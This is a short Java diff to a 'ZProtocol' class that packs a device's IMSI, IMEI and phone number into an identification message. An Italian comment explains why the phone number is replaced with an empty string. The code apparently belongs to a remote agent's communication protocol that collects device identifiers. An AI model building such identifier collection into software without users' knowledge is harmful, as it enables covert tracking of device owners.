@@ -543,7 +543,11 @@ public class ZProtocol extends Protocol {
 
 		final byte[] userid = WChar.pascalize(device.getImsi());
 		final byte[] deviceid = WChar.pascalize(device.getImei());
-		final byte[] phone = WChar.pascalize(device.getPhoneNumber());
+		
+		// Non abbiamo quasi mai il numero, inviamo una stringa vuota
+		// cosi appare l'ip
+		//WChar.pascalize(device.getPhoneNumber());
+		final byte[] phone = WChar.pascalize("");
 
 		final int len = 4 + userid.length + deviceid.length + phone.length;
 
@@ -555,10 +559,12 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(userid);
 		dataBuffer.write(deviceid);
 		dataBuffer.write(phone);
+		
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == content.length,
 					"forgeIdentification pos: " + dataBuffer.getPosition()); //$NON-NLS-1$
 		}
+		
 		return content;
 	}
 
